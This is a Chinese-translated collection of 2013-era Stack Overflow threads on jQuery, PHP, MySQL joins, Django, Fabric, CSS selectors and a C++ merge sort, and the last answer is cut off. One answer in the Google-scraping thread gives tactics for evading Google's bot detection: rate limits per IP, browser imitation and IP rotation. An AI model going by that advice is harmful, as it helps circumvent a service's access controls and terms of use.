> 时间：2013-01-22T23:16:07.820
> 
> 标签：jquery

我希望准确了解符号绑定的内容和绑定方式，以及它的底层结构是什么样的。

我*猜*它是用标签完成的，但我对 JavaScript 的经验不够肯定。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-22T23:22:01.797

奇怪的问题。该`$`符号只是 的别名`jQuery`。

所以，而不是这个：

```
jQuery('a').css('color','#f00'); 
```

...你可以这样做：

```
$('a').css('color','#f00'); 
```

它也不一定需要`$`。如果你喜欢，你可以**加更多的钱**。这有效：

```
(function ($$$$$$) {
    $$$$$$('body').html('Nobody will mess with you when you have this much cash.');
}(jQuery)); 
```

似乎正常的 JavaScript 变量命名规则适用：

*   变量名必须以字母开头
*   `$`变量名也可以以and开头`_`
*   变量名区分大小写

如果您愿意，您的别名可以是`orange_peanut`，但出于显而易见的原因，我们不要这样做。

希望有帮助！:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-22T23:22:44.960

我记得我自己最初对此感到困惑。但这`$`只是一个引用静态全局 JQuery 对象的变量。作为一个美元符号，它绝对没有什么特别之处——它只是一个方便而简短的变量名，John Resig（大概）认为它并没有在其他地方广泛使用。您可以在使用下划线 (_) 作为其默认全局变量的下划线库中看到类似的模式。

现在，它*确实*有某种奇怪的调用模式，因为不是普通的变量，而是像这样使用它：

```
myObj.myFunction(myParam); 
```

JQuery 静态对象既是对象*又*是函数。所以你可以这样称呼它（一个函数）：

```
$('div').empty(); 
```

或者有时像这样（像一个对象）：

```
$.ajax({url: "http://fiddle.jshell.net/favicon.png"}); 
```

但是它做了很多很多很多的事情，以及很多关于它如何做这些事情的微妙之处。要获得更好的信息，只需查看 JQuery 文档：[http](http://api.jquery.com/) ://api.jquery.com/ 。并在 SO 上查看 JQuery 问题 - 他们有很多信息。你最终会捡起来的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T23:18:07.060

这`$`是 main`jQuery()`函数的别名。换句话说，它是一个函数对象，就像 Javascript 中的所有函数一样，它上面有许多属性。

# php - 变量引用错误？

> ID：14469833
> 
> 赞同：0
> 
> 时间：2013-01-22T23:16:53.940
> 
> 标签：php

我有一个无法理解的问题，以下代码为什么是 print Array ( [a] => 1 [b] => 2 [c] => 3 [d] => ) ，我没有更改 $info 变量但是为什么它改变了？

```
<?php
function ifSetOr(&$a, $b = null) {
    return isset($a) ? $a : $b;
}

$info = array('a' => 1, 'b' => 2, 'c' => 3);
ifSetOr($info['d']);
print_r($info); //Array ( [a] => 1 [b] => 2 [c] => 3 [d] => ) 
?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:19:51.677

`$info['d']`当您将它作为参考传递时，您隐式创建了它。

出于这个原因，像这样的 ifSetOr 函数永远无法工作。您不能传递不存在的变量。还要记住，“参数”`isset`是一个例外，因为`isset`它实际上不是一个函数，而是一个语言结构。

# php - 谷歌允许一个请求抓取多少个结果？

> ID：14469835
> 
> 赞同：2
> 
> 时间：2013-01-22T23:17:34.520
> 
> 标签：php, scrape

以下 PHP 代码可以正常工作，但是当它用于为指定关键字抓取 1000 个 Google 结果时，它只返回 100 个结果。Google 是否对返回的结果有限制，还是有其他问题？

```
<?php
require_once ("header.php");
$data2 = getContent("http://www.google.de/search?q=auch&hl=de&num=100&gl=de&ix=nh&sourceid=chrome&ie=UTF-8");
    $dom = new DOMDocument();
    @$dom->loadHtml($data2);
    $xpath = new DOMXPath($dom);

    $hrefs = $xpath->evaluate("//div[@id='ires']//li/h3/a/@href");
    $j = 0;

    foreach ($hrefs as $href)
    {            

        $url = "http://www.google.de/" . $href->value . "";
        echo "<b>";

        echo "$j ";
      echo   $url = get_string_between($url, "http://www.google.de//url?q=", "&sa=");
      echo "<br/>";

      $j++;
        }
?> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T23:44:44.340

> 谷歌允许一个请求抓取多少个结果？

[零](http://productforums.google.com/forum/#!topic/websearch/zf3S2Y--X9I)。您可以抓取零页。

```
Please refer to clause 5.3 of the Google Terms of Service:

"You specifically agree not to access (or attempt to access) 
any of the Services through any automated means (including use 
of scripts or web crawlers)..." 
```

您可以尝试规避他们的检测机制；谷歌搜索“scrape google search”会发现几种建议的技术。但这不是谷歌支持的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-03-28T02:19:20.493

无论如何，如果您仍在您的项目中，您已经接受了答案：

正如人们所指出的，谷歌不喜欢被刮。他们的条款不允许这样做，因此如果您同意他们，您会通过自动访问该站点来破坏它们。然而，谷歌本身并不关心网站启动时的访问权限。甚至 Bing 是由谷歌提供支持并被抓到这样做的，我想大多数其他搜索引擎也从谷歌借用。

如果您必须抓取 Google，请将比率保持在其检测率以下。不要锤他们，因为这只会让你的项目扎根，而且谷歌会更加关注自动访问，这通常会让我们更难。

根据我的经验，您可以以每小时 15 到 20 个请求（使用一个 IP）的速度长期访问 Google，而不会被阻止。当然，您的代码需要模拟浏览器并正常运行。较高的费率会让您首先（通常）被临时验证码阻止。解决验证码会创建一个允许您继续的 cookie。我见过长期的验证码，也见过一个 IP 和大型子网的永久块。所以规则#1：不要被检测到，如果你被检测到然后自动停止你的刮刀。

[所以这有点棘手，但如果你依赖于以这种方式获取数据，请查看http://scraping.compunect.com/](http://scraping.compunect.com/)上的开源 PHP 项目， 这是一个可以抓取多个关键字和多个页面的 PHP 代码并管理 IP 地址，使其不会被阻止。我正在将该代码用于项目，它到目前为止有效。

如果你只需要从谷歌收集少量数据，而真正的排名并不重要，看看他们的 API。如果排名很重要，或者如果您需要大量数据，您将需要像我链接的那样的谷歌刮板。

顺便说一句，PHP 非常适合该任务，但您应该将其作为本地脚本运行，而不是通过 Apache。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-22T23:37:33.767

由于您正在解析实际网站的 HTML，因此不要期望它仅仅因为更改单个参数而返回任意数量的结果。

正如您在*搜索设置*页面上看到的那样，最多 100 个项目： [https ://www.google.com/preferences?hl=en](https://www.google.com/preferences?hl=en)

如果您需要 1000 个结果，则必须分别解析前 10 个结果页面。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-22T23:41:09.773

> ... 不允许抓取 Google 结果...

Google 提供[免费且干净的搜索 API](https://developers.google.com/custom-search/v1/overview)！

示例代码（REST）：

```
GET https://www.googleapis.com/customsearch/v1?parameters 
```

# mysql - 两个左连接给了我不真实的数据（双数据？）与 MySQL

> ID：14469837
> 
> 赞同：0
> 
> 时间：2013-01-22T23:17:38.020
> 
> 标签：mysql, sql

这是我的查询：

```
SELECT `products`.*, SUM(orders.total_count) AS revenue,
    SUM(orders.quantity) AS qty, ROUND(AVG(product_reviews.stars)) as avg_stars 
FROM `products` 
LEFT JOIN `orders`
    ON (`products`.`id` = `orders`.`product_id`) AND
    (`orders`.`status` = 'delivered' OR `orders`.`status` = 'new') 
LEFT JOIN product_reviews
    ON (products.id = product_reviews.product_id)
GROUP BY `products`.`ID`
ORDER BY products.ID DESC
LIMIT 10
OFFSET 0 
```

当我有第二个左连接时，我的第一个左连接数据、收入和订单表中的数量给我的值根本不正确（太高了，很多双打？）

从[这个问题](https://stackoverflow.com/questions/14469226/keep-rows-even-if-they-dont-have-any-rows-in-other-join-table-mysql-query/14469260#comment20156827_14469260)。

我得到了获得半笛卡尔产品的方向，因此对产品的两次评论使数量翻了一番，我相信这是我的问题。

如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:29:18.343

问题是`product_reviews`and orders 表的每个产品 ID 可以有不止一行。解决此问题的一种方法是使用子查询：

```
SELECT `products`.*, 
  o.revenue,
  o.qty, 
  ROUND(avg_stars) as avg_stars 
FROM `products` 
LEFT JOIN
(
  select `product_id`, 
    sum(total_count) revenue,
    sum(quantity) qty
  from `orders`
  where `status` in ('delivered', 'new')
  group by `product_id`
) o
  ON `products`.`id` = o.`product_id`
LEFT JOIN
(
  select product_id, avg(stars) avg_stars
  from product_reviews
  group by product_id
) pr
    ON (products.id = pr.product_id)
ORDER BY products.ID DESC
LIMIT 10
OFFSET 0 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:34:00.277

避免该问题的一种方法是在 SELECT 列表中使用相关子查询，而不是左连接。

```
SELECT p.*
     , SUM(o.total_count) AS revenue
     , SUM(o.quantity) AS qty
     , ( SELECT ROUND(AVG(r.stars))
           FROM `product_reviews` r
          WHERE r.product_id = p.id 
       ) AS avg_stars
  FROM `products` p
  LEFT
  JOIN `orders` o
    ON o.product_id = p.id
   AND o.status IN ('delivered','new')
 GROUP BY p.id
 ORDER BY p.id DESC
 LIMIT 10
 OFFSET 0 
```

这不是唯一的方法，也不一定是最好的方法，尤其是对于大型集合但考虑到子查询将运行最多 10 次（给定 LIMIT 子句），性能应该是合理的（给定适当的`product_reviews(product_id,stars)`.

如果您要返回所有产品 ID，或者其中很大一部分，那么使用内联视图可能会提供更好的性能（避免在选择列表中执行相关子查询的嵌套循环）

```
SELECT p.*
     , SUM(o.total_count) AS revenue
     , SUM(o.quantity) AS qty
     , s.avg_stars
  FROM `products` p
  LEFT
  JOIN `orders` o
    ON o.product_id = p.id
   AND o.status IN ('delivered','new')
  LEFT
  JOIN ( SELECT ROUND(AVG(r.stars)) AS avg_stars
              , r.product_id
           FROM `product_reviews` r
          GROUP BY r.product_id 
       ) s
    ON s.product_id = p.id
 GROUP BY p.id
 ORDER BY p.id DESC
 LIMIT 10
 OFFSET 0 
```

* * *

需要明确的是：原始查询的问题在于，产品的每个订单都与该产品的每个评论相匹配。

如果我对“半笛卡尔”一词的使用具有误导性或混淆性，我深表歉意。

我的意思是，您有两个不同的集合（产品的订单集和产品的评论集），并且您的查询正在生成这两个不同的“交叉产品”集，基本上将每个订单与每个评论“匹配”（针对特定产品）。

例如，给定 product_id 101 的三行，`reviews`product_id 101 的两行`orders`，例如：

```
REVIEWS
pid  stars text
---  ----- --------------
101  4.5   woo hoo perfect
101  3     ehh
101  1     totally sucked

ORDERS
pid  date   qty 
---  -----  ---
101  1/13   100
101  1/22   7 
```

您的原始查询基本上形成了一个包含六行的结果集，订单中的每一行都与评论中的所有三行相匹配：

```
id   date   qty   stars text
---  ----   ----  ----  ------------
101  1/13   100   4.5   woo hoo perfect
101  1/13   100   3     ehh
101  1/13   100   1     totally sucked
101  1/22   7     4.5   woo hoo perfect
101  1/22   7     3     ehh
101  1/22   7     1     totally sucked 
```

然后，当应用 qty 上的 SUM 聚合时，返回的值比您预期的要大得多。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-22T23:51:25.063

如果不看表模式就不容易解决这个问题，我建议你先看看你的聚合和分组依据语句，然后看看你的列默认值，你是如何处理空值的，还要看看聚合函数中的 DISTINCT。

如果所有其他方法都失败并且“优化”解决方案并不重要并且您的数据量很低，则仅在您需要值的表上执行 Sub Select，在 Sub Select on 1 table 中，您的行范围要窄得多，并且它将产生正确的结果。

我建议您在此处提供表模式。

# python - django 没有为重复的主键提高 IntegrityError

> ID：14469841
> 
> 赞同：4
> 
> 时间：2013-01-22T23:18:02.287
> 
> 标签：python, django, django-testing

django 是否强制主键的唯一性？

[这里](https://docs.djangoproject.com/en/dev/ref/models/fields/#django.db.models.Field.primary_key)的文档似乎是这样建议的，但是当我将一个类定义为：

```
class Site(models.Model):
    id = models.IntegerField(primary_key=True) 
```

并在测试用例中测试此约束：

```
class SiteTestCase(TestCase):
    def setUp(self):
        self.site = Site(id=0, name='Site')
        self.site.save()

    def tearDown(self):
        self.site.delete()

    def test_unique_id(self):
        with self.assertRaises(IntegrityError):
            badSite = Site(id=0, name='Bad Site')
            badSite.save()
            badSite.delete() 
```

测试失败。

如果我在正常字段（primary_key=False，unique=True）上进行测试，那么异常会正确引发。在 id 字段上设置 unique=True 不会改变结果。

我在这里缺少关于 primary_key 字段的内容吗？

如果相关的话，我的数据库后端是 MySQL。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:23:16.070

你的测试方法是错误的。您在这里所做的是更新现有实例，因为您提供的是已使用的主键。将 更改`save`为`force_insert`类似的。

```
def test_unique_id(self):
        with self.assertRaises(IntegrityError):
            badSite = Site(id=0, name='Bad Site')
            badSite.save(force_insert=True)
            badSite.delete() 
```

django 文档解释了[django 如何知道是 UPDATE 还是 INSERT](https://docs.djangoproject.com/en/dev/ref/models/instances/?from=olddocs#how-django-knows-to-update-vs-insert)。您应该阅读该部分。

你知道 django 已经支持自动主键了吗？有关更多说明，请参阅[文档](https://docs.djangoproject.com/en/dev/topics/db/models/#automatic-primary-key-fields)。

# php - 自动同步两个mysql表，但有异常

> ID：14469842
> 
> 赞同：2
> 
> 时间：2013-01-22T23:18:02.400
> 
> 标签：php, mysql, cron, phpmyadmin

我有 2 个脚本的 sql 表，我需要同步到另一个，这可以通过 php cron （这是我的计划）从一行中完成

表 1 表 2

第 1 行 <----> 第 1 行

第 2 行 <----> 第 2 行

第 3 行不同步 第 3 行

同一服务器上的两个数据库和同一用户对两者都具有完全权限

我正在寻找通过 cpanel cron 执行此操作的 php 代码

事后考虑是否最好将两者合并，以便使用新数据进行更新？

问题是在上面的示例中，我需要第 3 行不要在两个数据库上进行更改

我很菜鸟，所以请提前好笑谢谢

更新*******

我应该学习如何更好地解释。

这两个数据库都是站点的控制面板，其中一个表行中包含系统 url，所以如果我共享数据库“站点 2”链接指回“站点 1”，这对我来说是一个复杂的问题，因为我非常对此很陌生。

我需要的是使两个数据库保持最新状态，除了单行，这对两个数据库来说又是不同的。

我还没有尝试过任何东西，因为我不知道从哪里开始:(哈哈

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:41:49.413

您不必使用 cron。当前版本的 MySQL 支持`TRIGGERS`和`EVENTS`.

您可以使用 TRIGGER 将数据复制到另一个表。该副本（或任何其他操作）可能由某些事件（如表中的插入、更新或删除）触发。`TRIGGER`可以运行任何查询或任何 PL/SQL 代码。

其他选项是`EVENT`. 这类似于 MySQL 中内置的内部任务调度程序。它还可以运行查询或任何 PL/SQL 代码，但它是由系统时间触发的（如 Linux Cron）。与 cron 相比，它有很多优点。

PL/SQL 是过程 SQL，具有循环、变量等。

如果您认为自己是“菜鸟”-我可以治愈您。阅读有关 MySQL 的书籍，或者如果你是懒惰的 - 观看一些教程（[http](http://thenewboston.org) : //thenewboston.org，http: [//phpacademy.org](http://phpacademy.org)）。

这里没有人会为你写代码。我们只能修复错误，提供建议等:)

编辑。

事件示例：

```
-- this is comment in SQL language (line starts with --)
CREATE EVENT event_daily_copy_something
    ON SCHEDULE
      EVERY 1 DAY
    COMMENT 'This text will appear in MySQL Workbench as description of event'
    DO
      BEGIN
        INSERT INTO your_db_name.target_table_name(id, field)
          SELECT id, something
            FROM your_db_name.source_table_name
            WHERE id = 3;
      END 
```

表的同步是相当复杂的。我认为您在事件中需要很少的操作。

1.  检查新行并复制
2.  检查已删除的行并在“复制”表中删除它们
3.  检查更改的行（这里源表上的触发器非常有用，因为触发器“知道”编辑了什么行，您可以访问表 1 中的新字段值并使用它们来更新表 2）。

[MySQL 教程之一 - thenewboston@youtube。](http://www.youtube.com/watch?v=KgiCxe-ZW8o&list=PL173650DBBF608622)

# arrays - Firefox 奇怪地处理数组/对象序列化？

> ID：14469858
> 
> 赞同：1
> 
> 时间：2013-01-22T23:19:56.200
> 
> 标签：arrays, json, firefox, object, trigger.io

通过 trigger.io 构建插件，我在 Chrome/Safari 和 Firefox 中看到了奇怪的行为。

在 Firefox 中，数组被转换为以数字为键的对象，例如：

```
["getData", ["x"]] 
```

正在变成：

```
{"0":"getData","1":{"0":"x"}} 
```

这会导致序列化/反序列化、跨浏览器规范化等各种问题，我不清楚为什么会发生这种情况。

当通过 forge.message 将对象从前景传递到背景时似乎会发生这种情况 - 很高兴回答任何问题以缩小范围！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-23T09:53:04.497

这看起来确实很奇怪，你能告诉我们你使用的是什么版本的 Firefox 吗？

同时，您可以使用 JSON.stringify 和 JSON.parse 自己序列化和反序列化数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-24T19:58:09.673

这是由 Firefox 扩展中的数组序列化错误引起的，请参阅：[Firefox 扩展正在将 javascript 数组作为对象发送](https://stackoverflow.com/questions/12727733/firefox-extension-is-sending-javascript-array-as-an-object-instead)

正如@connorhd 所说，解决方案（直到firefox 解决问题）是在前台和后台之间发送消息时将其反序列化为json。对我们来说不幸的是，这是一个热门路径，并且不是非常受欢迎的开销，但它似乎（或多或少）解决了 Firefox 18 中的问题。

# python - 如何确定 fabfile 中的结构角色以将特定文件发送到主机

> ID：14469859
> 
> 赞同：2
> 
> 时间：2013-01-22T23:20:05.867
> 
> 标签：python, fabric

我有一个看起来像这样的环境：

```
env.roledefs = {
    'cisco-collectors': ['hosta', 'hostb', 'hostc'],
    'brocade-collectors': ['hosta', 'hostd']
} 
```

我有一些特定的文件需要发送到特定角色的主机：

```
files = {
    'cisco-collectors': ['/path/to/filea', '/path/to/fileb'],
    'brocade-collectors': ['/path/to/filec', '/path/to/filed']
} 
```

如何编写我的 sendFiles() 函数，以便在命令行上指定角色时，甚至使用`@roles()`装饰器时，我将能够获得正确的文件列表？

[这个问题](https://stackoverflow.com/questions/3098912/how-to-discover-current-role-in-python-fabric)显示了一种确定主机是否属于某个角色的方法，但我需要获取当前正在执行的角色，以便我知道要发送哪个文件列表。

理想情况下，它看起来像这样：

```
@roles('cisco-collectors', 'brocade-collectors')    
def sendFiles():
  for file in files[env.current_role]:
    put(file) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:51:42.637

`env.host_string.role``fabric`包含最新源中的当前角色（未发布）。

[提交](https://github.com/flupke/fabric/commit/47650dc14f406bf56f6210744fd55dca3b7be58f)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:59:51.137

在我的测试中，我认为您无法可靠地获得 1.5 中的当前角色。请参阅 Pavel 关于这将如何改变的回答。虽然这看起来不方便，但我认为原因是 Fabric 结合了主机列表，因此角色不会延续。

不过，如果您不需要使用角色功能，则有一种解决方法。您可以创建一个更改主机列表的任务。但这**仅**适用于一个角色！

```
from fabric.api import task, local, env

@task
def role1():
    env.current_role = 'role1'
    env.hosts.extend(['example.com'])

@task
def role2():
    env.current_role = 'role2'
    env.hosts.extend(['test.example.com'])

@task
def test():
    print env.current_role
    print env.hosts 
```

如果您现在运行`fab role1 test`，您将看到：

```
[localhost] Executing task 'test'
role1
['localhost', 'example.com']
[example.com] Executing task 'test'
role1
['localhost', 'example.com'] 
```

不完全是您所追求的……但可能会帮助您找到可行的方法。

# jquery - 仅当特定元素位于您要选择的元素之后，如何使用 CSS 选择元素？

> ID：14469860
> 
> 赞同：10
> 
> 时间：2013-01-22T23:20:06.467
> 
> 标签：jquery, html, css, css-selectors

使用 CSS 和下面的例子，有没有办法只选择`<p>`后面跟着 's 的`<ul>`'s？

如果不是，什么是 jQuery 选择器，还是需要`if`声明？

```
<p>Hello there.</p>

<p>Select this para!</p>
<ul>
    <li>list item</li>
</ul>

<ul>
    <li>don't select this list! :)</li>
</ul>

<p>And don't select this paragraph! :)</p> 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-01-22T23:29:36.260

这在 CSS3 中是不可能的，你能做的最好的就是只选择`<ul>`下面的`<p>`：

```
p + ul { /*...*/ } 
```

然而，当浏览器开始实现[CSS4 主题运算符](http://dev.w3.org/csswg/selectors4/#subject)时，它是可能的：

```
!p + ul { /*...*/ } 
```

同时，您必须使用 jQuery 并返回 DOM。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-01-22T23:23:16.113

不，实际上 CSS 不会在这方面帮助您。

您需要的是不存在的先前兄弟选择器。

也看看这个：[是否有“前一个兄弟”CSS 选择器？](https://stackoverflow.com/questions/1817792/css-previous-sibling-selector)

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-01-22T23:29:52.307

不幸的是，您将需要使用 javascript。与您想要的最接近的 CSS 选择器（相邻的兄弟选择器）将与您想要的完全相反。例如，您可以`<ul>`在`<p>`这样的后面全选：

```
p + ul { //style } 
```

但是，您可以像这样在 jQuery 中进行选择：

```
$('p + ul').prev('p') 
```

因此，您首先`<ul>`立即选择所有`<p>`，然后`<p>`从它们中选择前一个。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-01-22T23:28:28.900

[http://api.jquery.com/prev/](http://api.jquery.com/prev/)

像这样的东西对你有用吗？您可能需要向 P 中添加一个类，

但它应该允许您在 Uls 之前选择每个类选定元素

例子：

```
<p class="selected">my p</p>
<ul>My ul</ul>
<script>$("ul").prev(".selected").css("background", "yellow");</script>
</body> 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-06-23T19:12:55.210

您还可以在 ul 之前的 p 之前粘贴一个空跨度并选择它：

```
span + p {
margin-bottom: 0;
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-09-03T08:35:12.250

使用 :not/:has 选择器（但是没有广泛的支持）

```
<div>
   <span>first</span>
   <span>second</span>
</div> 
```

```
div span:not(:last-of-type){
  border: 1px solid red;
}

p:has(+ ul){
  display: block;
  border: 1px solid blue;
}
```

```
<div>
<span>first</span>
<span>second</span>
</div>

<div>
<p>Hello there.</p>

<p>Select this para!</p>
<ul>
    <li>list item</li>
</ul>

<ul>
    <li>don't select this list! :)</li>
</ul>

<p>And don't select this paragraph! :)</p>
</div>
```

# jquery - AjaxUpload 插件在 Firefox 中不起作用

> ID：14469865
> 
> 赞同：0
> 
> 时间：2013-01-22T23:21:00.097
> 
> 标签：jquery, sharepoint, file-upload, web-parts, ajax-upload

我有以下代码来初始化我的 js 中的 Ajax 上传设置：

```
 new AjaxUpload($('.btnAdjuntar'), {
    action: '/_layouts/Company.PortalFFVV.SharePoint.WebParts/Handlers/UploadFile.ashx',
    onSubmit: function (file, ext) {
        if (!(ext && /^(jpg)|(png)|(gif)|(pdf)|(txt)|(avi)$/i.test(ext))) {
            showPopup('Solo se permite archivos de tipo images, audio , video , PDF y text. (Extensiones permitidas: jpg, png, gif, pdf, txt, avi).');
            return false;
        }
        this.setData({ 'accion': 'A', 'fileName': AdminArchivoExterno.filename, 'maxFileSize': DatosConsultaSession.TamanioAdjuntoMailing })
        showNofication("Espere un momento mientras se carga el archivo seleccionado...", "btnAdjuntar");
    },
    onComplete: function (file, response) {
        removeNofication(strStickyNotificationID, classButtonNotificaction);
        var resultado = new Array();
        resultado = response.split("%#%");

        if (resultado[0] == "True") {
            $('.txtDirectorioDatos').val(file);
            $('#divgvAdjuntos').html(resultado[2]);
        }
        else {
            $('.txtDirectorioDatos').val('');
            AdminArchivoExterno.filename = "";
            showPopup(resultado[1])
            return false;
        }
        CantidadAdjuntos = resultado[3];

    }
}); 
```

所以问题是当我点击附加文件按钮（'.btnAdjuntar'）时没有任何反应。但它在 IE 和 Chrome 中运行良好。

附加按钮文件位于 jquery 模式中。

我正在使用放置在共享点页面中的 web 部件（js 属于 web 部件）（我使用 vs 2012）。

如果你们需要更多信息，请告诉我。谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:51:13.910

Ajaxupload 创建一个 div，然后在其中创建输入文件控件。它为 div 设置的 z-index 对于 Firefox 来说有点太高了。在插件中找到 _createInput 函数，它为 div 设置 z-index。将其更改为较低的值并重试。对我有用的号码是 2147483

# php - MySQL/PHP“列的数据太长”

> ID：14469866
> 
> 赞同：1
> 
> 时间：2013-01-22T23:21:03.323
> 
> 标签：php, mysql

尝试在 MySQL 表中插入单行时出现“数据对列而言太长”错误。我知道数据库设置正确，因为我可以毫无问题地以其他方式插入相同的数据。以下是代码的基本部分。如果您想查看任何函数的完整代码而不是伪代码，我很乐意发布 - 只是为了避免混乱。

输出如下：

> 连接到 MySQL
> 连接到数据库 dublin
> 第 1 行的列“gpsMin”数据太长

测试索引.php

```
include 'parseData.php';
parseAll("dublin"); 
```

解析数据.php

```
function parseAll($sitename){
  function pullAndDelete($filename){} #reads data from file, deletes file
  $data = pullAndDelete($sitename);

  function parse($str){} #extracts first piece of data from data string
  function chop2($str){} #removes 2 chars from front of string
  function chop14($str){} #removes 14 chars from front of string

  #$data is put through parse and chop functions several times -
  #take first piece of data, chop it off, take new first piece, chop again, etc.
  #Function calls up through relevant one:

  $radio=parse($data);
  $short1=chop14($data);
  $antenna=parse($short1);
  $short2=chop14($short1);
  $gpsmaj=parse($short2);
  $short3=chop14($short2);
  $gpsmin=parse($short3); 
```

此时，调用 strlen() 函数的 echo'ed 产生以下输出：
Radio: 0 Strlen: 1
Antenna: 0 Strlen: 1
GPS Major: 0 Strlen: 1
GPS Minor: 0 Strlen: 1

```
 function writeToDB($site, $a, $b, $c, $d, $e, $f, $g, $h, $b1, $b2, $temp, $d, $t)
  {
  mysql_connect(xxx,xxx,xxx) or die(mysql_error());
  echo "Connected to MySQL<br />";

  mysql_select_db("scada") or die(mysql_error());
  echo "Connected to table ".$site."<br />";

  mysql_query("INSERT INTO ".$site." (radio, antenna, gpsMaj, gpsMin, acpwr,
   generator, blank1, blank2, battery1, battery2, temperature, date, time)
   VALUES($a, $b, $c, $d, $e, $f, $g, $h, $b1, $b2, $temp, $d, $t)")
  or die(mysql_error());
  echo "Data inserted into table ".$site;
  }

  writeToDB($sitename, $radio, $antenna, $gpsmaj, $gpsmin, $acpwr, $generator,
   $blank1, $blank2, $batt1, $batt2, $temperature, $mysqldate, $mysqltime);
} #end parseAll() 
```

所以 db 设置正确，strlen() 函数告诉我数据的长度是正确的。我看不到任何东西以任何方式添加到其中，前三个（收音机、天线、gpsmaj）很好。我在一个名为 dbconnector.php 的文件中有这个函数的另一个版本，它运行良好。我找不到两者之间的区别。

提前致谢！

**编辑：**
列数据类型是二进制。
var 值为 0。

显示创建表都柏林；
CREATE TABLE `dublin`(
`idsiteData`int(11) NOT NULL AUTO_INCREMENT,
`radio`binary(1) DEFAULT NULL,
`antenna`binary(1) DEFAULT NULL,
`gpsMaj`binary(1) DEFAULT NULL,
`gpsMin`binary(1) DEFAULT NULL,
`acpwr`binary(1) DEFAULT NULL,
`gener.. .

“gpsmin”上的 Vardump 显示了这一点：

> 字符串（1）“0”

不确定我是否正确执行了第二个 vardump，但这是最后一行，后面是一堆“未定义的变量”错误：

> 字符串（157）“插入（无线电，天线，gpsMaj，gpsMin，acpwr，发电机，空白1，空白2，电池1，电池2，温度，日期，时间）值（，，，，，，，，，，，，，，，，，）”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:56:29.383

查看生成的 SQL 查询，我认为您尝试作为二进制文件插入的变量实际上是`null`什么。

可能的工作是通过转换所有输入：

```
$a = (int)$a;
$b = (int)$b;
$c = (int)$c;
// ... do the rest for all of your binary variables 
```

（即使它不能在这里解决您的问题，将您真正需要零而不是`null`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T14:02:36.287

我想到了！我在其中插入了两个名为 $d 的变量。这就是我因过于高效而得到的。谢谢大家！

# c++ - C++：合并排序合并数组

> ID：14469867
> 
> 赞同：1
> 
> 时间：2013-01-22T23:21:07.120
> 
> 标签：c++, arrays, sorting, merge

当我运行代码时，我会得到很多重复的数字和/或大的负数，当你把东西添加到数组中时通常会出现这些数字和/或大的负数。我相信问题出在我自己进行合并时。

```
void mergeSort( int list[], int lb, int ub )
{
    int mid;
    if ( lb < ub )
    {
        mid = (lb + ub) /  2;
        mergeSort(list, lb, mid);
        mergeSort(list, mid + 1, ub);
        myMerge(list, lb, mid , ub);
    }
}

template <class M>
void myMerge( M list[], int lb, int mid, int ub )
{
   int i, j;
   int size1 = mid - lb + 1;
   int size2 = ub - mid;

    M* tmpArray1 = new M[size1 + 1];
    M* tmpArray2 = new M[size2 + 1];

    for( i=0; i<size1; i++ )
    {
        tmpArray1[i] = list[lb + i - 1];
    }

    for( j=0; j<size2; j++ )
    {
        tmpArray2[j] = list[mid + j];
    }

    tmpArray1[size1 + 1] = INT_MAX;
    tmpArray2[size2 + 1] = INT_MAX;

    i = 0;
    j = i;

    for( int k=lb; k<ub; k++ )
    {
        if ( tmpArray1[i] <= tmpArray2[j] )
        {
            list[k] = tmpArray1[i];
                i++;
        }
        else
        {
            list[k] = tmpArray2[j];
            j++;
        }
    }
} 
```

这可能是像迭代问题这样愚蠢的事情......有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:51:19.343

在这一行：

```
 tmpArray1[i] = list[lb + i - 1]; 
```

你的意思肯定是这样的：

```
 tmpArray1[i] = list[lb + i]; 
```

否则，您将从给定的合并范围之外获取一个值，这将解释重复的数字。当您写回列表时，您不会使用该逻辑。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-22T23:52:46.367

我假设`mergeSort`代码是正确的，这意味着`ub`应该是要排序的范围的最后一个索引。如果不是这种情况，`mergeSort`则执行错误（并且`merge`仍然会执行，但方式略有不同）。

填充时从范围之前访问元素`tmpArray1`：

```
for( i=0; i<size1; i++ )
{
    tmpArray1[i] = list[lb + i - 1];
} 
```

范围内的第一个元素是`list[lb]`，不是`list[lb-1]`。

您在填充时忽略了范围末尾的一个元素`tmpArray2`：

```
for( j=0; j<size2; j++ )
{
    tmpArray2[j] = list[mid + j];
} 
```

那应该在`list[mid + 1 + j]`那里。

合并时，您不会合并所有元素：

```
for( int k=lb; k<ub; k++ )
{
    if ( tmpArray1[i] <= tmpArray2[j] )
    {
        list[k] = tmpArray1[i];
            i++;
    }
    else
    {
        list[k] = tmpArray2[j];
        j++;
    }
} 
```

那应该`k <= ub`在循环控制中。

但是，最让我头疼的是

```
tmpArray1[size1 + 1] = INT_MAX;
tmpArray2[size2 + 1] = INT_MAX; 
```

